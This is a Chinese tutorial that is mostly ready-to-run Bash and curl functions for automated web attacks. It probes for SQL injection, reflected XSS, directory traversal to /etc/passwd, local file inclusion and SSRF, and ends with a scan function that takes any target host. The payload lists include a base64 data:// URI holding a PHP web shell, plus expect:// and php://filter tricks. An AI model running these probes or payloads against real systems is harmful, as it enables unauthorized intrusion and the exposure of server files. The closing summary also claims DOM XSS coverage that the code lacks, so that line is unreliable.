# Web漏洞自动化：SQL注入/XSS检测

## 概述

Web 漏洞自动化检测是渗透测试中最常见的任务之一。本文详细介绍使用 Bash + curl 实现 SQL 注入、XSS、目录遍历和文件包含漏洞的自动化检测。

## 核心理念

- **请求最小化**：减少不必要的请求，避免触发 WAF
- **Payload 多样化**：使用多种绕过方式测试
- **结果可验证**：所有检测结果需要人工确认
- **安全第一**：不执行破坏性操作

---

## 1. SQL注入检测

### 1.1 基于错误的检测

```bash
check_sql_error() {
    local response="$1"
    local patterns=("SQL syntax" "mysql_fetch" "ORA-" "PostgreSQL" "SQLite" "Microsoft OLE DB" "ODBC SQL Server" "unclosed quotation" "You have an error in your SQL" "Warning: mysql")
    for pattern in "${patterns[@]}"; do
        echo "$response" | grep -qi "$pattern" && return 0
    done
    return 1
}

test_error_based() {
    local url="$1" param="$2"
    local payload="'"
    local response
    response=$(curl -s --max-time 10 "${url}&${param}=${payload}" 2>/dev/null) || true
    if check_sql_error "$response"; then
        echo "[+] 存在基于错误的SQL注入: $param"
        return 0
    fi
    payload='"'
    response=$(curl -s --max-time 10 "${url}&${param}=${payload}" 2>/dev/null) || true
    if check_sql_error "$response"; then
        echo "[+] 存在基于错误的SQL注入 (双引号): $param"
        return 0
    fi
    return 1
}
```

### 1.2 基于时间的盲注

```bash
test_time_based() {
    local url="$1" param="$2" delay="${3:-5}"
    local start_time end_time inject_time

    local payload="' OR SLEEP(${delay})-- -"
    start_time=$(date +%s%N)
    curl -s --max-time $((delay + 10)) "${url}&${param}=${payload}" >/dev/null 2>&1 || true
    end_time=$(date +%s%N)
    inject_time=$(( (end_time - start_time) / 1000000 ))

    local threshold=$((delay * 800))
    if (( inject_time > threshold )); then
        echo "[+] 存在基于时间的盲注: $param (延迟 ${inject_time}ms)"
        return 0
    fi
    return 1
}
```

### 1.3 布尔盲注

```bash
test_boolean_based() {
    local url="$1" param="$2"
    local normal_response
    normal_response=$(curl -s --max-time 10 "$url" 2>/dev/null) || true
    local normal_length=${#normal_response}

    local payload="' OR '1'='1"
    local true_response
    true_response=$(curl -s --max-time 10 "${url}&${param}=${payload}" 2>/dev/null) || true
    local true_length=${#true_response}

    payload="' OR '1'='2"
    local false_response
    false_response=$(curl -s --max-time 10 "${url}&${param}=${payload}" 2>/dev/null) || true
    local false_length=${#false_response}

    if (( true_length != false_length )) && (( true_length == normal_length )); then
        echo "[+] 存在布尔盲注: $param"
        return 0
    fi
    return 1
}
```

### 1.4 Union注入

```bash
test_union_based() {
    local url="$1" param="$2" max_columns="${3:-20}"
    for ((i=1; i<=max_columns; i++)); do
        local nulls=""
        for ((j=1; j<=i; j++)); do
            [[ -n "$nulls" ]] && nulls+=","
            nulls+="NULL"
        done
        local payload="' UNION SELECT ${nulls}-- -"
        local response
        response=$(curl -s --max-time 10 "${url}&${param}=${payload}" 2>/dev/null) || true
        if ! check_sql_error "$response" && [[ -n "$response" ]]; then
            echo "[+] 可能的列数: $i"
            echo "    Payload: $payload"
            return 0
        fi
    done
    return 1
}
```

---

## 2. XSS检测

### 2.1 反射型XSS

```bash
XSS_PAYLOADS=(
    '<script>alert(1)</script>'
    '<img src=x onerror=alert(1)>'
    '<svg onload=alert(1)>'
    '<body onload=alert(1)>'
    '<input onfocus=alert(1) autofocus>'
    '<details open ontoggle=alert(1)>'
    '<video src=x onerror=alert(1)>'
    '"><script>alert(1)</script>'
    "';alert(1)//"
    '<<script>alert(1)//<</script>'
)

test_reflected_xss() {
    local url="$1" param="$2"
    for payload in "${XSS_PAYLOADS[@]}"; do
        local encoded_payload
        encoded_payload=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload")
        local response
        response=$(curl -s --max-time 10 "${url}&${param}=${encoded_payload}" 2>/dev/null) || true
        if echo "$response" | grep -qF "$payload"; then
            echo "[+] XSS漏洞发现: $param"
            echo "    Payload: $payload"
            return 0
        fi
    done
    return 1
}
```

### 2.2 XSS编码绕过

```bash
encode_payload() {
    local payload="$1" encoding="$2"
    case "$encoding" in
        url)         python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload" ;;
        double_url)  python3 -c "import urllib.parse,sys; print(urllib.parse.quote(urllib.parse.quote(sys.argv[1])))" "$payload" ;;
        html_entity) echo "$payload" | sed 's/</\\&#x3C;/g; s/>/\\&#x3E;/g' ;;
        base64)      echo -n "$payload" | base64 ;;
    esac
}
```

---

## 3. 目录遍历检测

```bash
TRAVERSAL_PAYLOADS=(
    "../../../etc/passwd"
    "....//....//....//etc/passwd"
    "..%2f..%2f..%2fetc/passwd"
    "..%252f..%252f..%252fetc/passwd"
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
    "..\\..\\..\\etc\\passwd"
)

TRAVERSAL_MARKERS=("root:" "daemon:" "[boot loader]" "Microsoft Windows")

test_directory_traversal() {
    local url="$1" param="$2"
    for payload in "${TRAVERSAL_PAYLOADS[@]}"; do
        local encoded
        encoded=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload")
        local response
        response=$(curl -s --max-time 10 "${url}&${param}=${encoded}" 2>/dev/null) || true
        for marker in "${TRAVERSAL_MARKERS[@]}"; do
            if echo "$response" | grep -qF "$marker"; then
                echo "[+] 目录遍历漏洞发现: $param"
                echo "    Payload: $payload"
                return 0
            fi
        done
    done
    return 1
}

directory_bruteforce() {
    local base_url="$1" wordlist="${2:-/usr/share/wordlists/dirb/common.txt}"
    echo "[*] 目录枚举: $base_url"
    while IFS= read -r path; do
        local response
        response=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "${base_url}/${path}" 2>/dev/null) || true
        if [[ "$response" =~ ^(200|301|302|403)$ ]]; then
            echo "[+] [${response}] ${base_url}/${path}"
        fi
    done < "$wordlist"
}
```

---

## 4. 文件包含检测

```bash
LFI_PAYLOADS=(
    "/etc/passwd"
    "/etc/passwd%00"
    "....//....//....//etc/passwd"
    "php://filter/convert.base64-encode/resource=/etc/passwd"
    "php://input"
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg=="
    "expect://id"
    "phar://test.jpg/test.php"
    "/proc/self/environ"
    "/var/log/apache2/access.log"
)

test_file_inclusion() {
    local url="$1" param="$2"
    for payload in "${LFI_PAYLOADS[@]}"; do
        local encoded
        encoded=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload")
        local response
        response=$(curl -s --max-time 10 "${url}&${param}=${encoded}" 2>/dev/null) || true
        if echo "$response" | grep -qF "root:"; then
            echo "[+] 文件包含漏洞发现: $param"
            echo "    Payload: $payload"
            return 0
        fi
    done
    return 1
}

# SSRF 检测
test_ssrf() {
    local url="$1" param="$2"
    local ssrf_payloads=("http://127.0.0.1" "http://localhost" "http://[::1]" "http://0x7f000001" "http://2130706433" "http://127.0.0.1.nip.io")
    for payload in "${ssrf_payloads[@]}"; do
        local encoded
        encoded=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload")
        local response_code
        response_code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "${url}&${param}=${encoded}" 2>/dev/null) || true
        if [[ "$response_code" == "200" ]]; then
            echo "[!] 可能的SSRF: $param -> $payload"
        fi
    done
}
```

---

## 5. 综合扫描脚本

```bash
full_web_scan() {
    local target="$1" base_url="http://${target}"
    echo "[*] 开始完整 Web 漏洞扫描: $target"

    # SQL注入扫描
    echo "[*] === SQL注入检测 ==="
    test_error_based "$base_url" "id"
    test_boolean_based "$base_url" "id"
    test_union_based "$base_url" "id"

    # XSS扫描
    echo "[*] === XSS检测 ==="
    test_reflected_xss "$base_url" "q"
    test_reflected_xss "$base_url" "search"
    test_reflected_xss "$base_url" "name"

    # 目录遍历扫描
    echo "[*] === 目录遍历检测 ==="
    test_directory_traversal "$base_url" "file"
    test_directory_traversal "$base_url" "path"
    test_directory_traversal "$base_url" "page"

    # 文件包含扫描
    echo "[*] === 文件包含检测 ==="
    test_file_inclusion "$base_url" "file"
    test_file_inclusion "$base_url" "include"
    test_file_inclusion "$base_url" "page"

    # SSRF扫描
    echo "[*] === SSRF检测 ==="
    test_ssrf "$base_url" "url"
    test_ssrf "$base_url" "callback"

    echo "[*] 扫描完成"
}
```

---

## 总结

本文介绍了使用 Bash + curl 实现 Web 漏洞自动化检测的完整流程：SQL注入（错误/时间/布尔/Union）、XSS（反射/DOM/编码绕过）、目录遍历、文件包含和SSRF检测。这些工具可以快速集成到渗透测试工作流中。
